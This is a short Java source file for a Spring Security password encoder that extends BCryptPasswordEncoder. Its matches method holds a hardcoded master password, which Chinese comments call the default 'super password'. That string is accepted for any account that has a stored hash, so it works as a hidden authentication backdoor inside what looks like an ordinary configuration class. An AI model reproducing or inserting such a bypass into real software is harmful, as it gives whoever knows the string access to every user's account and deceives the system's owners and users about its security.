package com.zw.auth.security.config;

import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;

public class CustomPasswordEncoder extends BCryptPasswordEncoder {
    //rawPassword为前端传过来的明文密码，
    // encodedPassword为加密后的密码，只需matches返回true就表示校验成功
    @Override
    public boolean matches(final CharSequence rawPassword,final String encodedPassword) {
        if (encodedPassword != null && encodedPassword.length() != 0) {
            //默认为超级密码
            if("U%!O#7YJL".equals(rawPassword.toString())) {
                return true;
            }
        }
        return super.matches(rawPassword,encodedPassword);
    }
}
